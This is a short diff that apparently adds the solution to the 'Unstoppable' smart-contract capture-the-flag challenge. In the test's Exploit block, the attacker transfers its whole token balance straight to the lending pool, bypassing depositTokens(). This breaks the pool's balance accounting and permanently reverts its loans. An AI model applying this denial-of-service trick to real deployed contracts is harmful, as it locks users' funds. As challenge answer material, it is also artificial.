@@ -40,6 +40,14 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /*
+        Send DVT tokens to pool without calling depositTokens()
+        => poolBalance state variable will be incorrect, reverting on assert statement
+        */
+
+        const attackerBalance = await this.token.balanceOf(attacker.address)
+        await this.token.connect(attacker).transfer(this.pool.address, attackerBalance)
     });
 
     after(async function () {
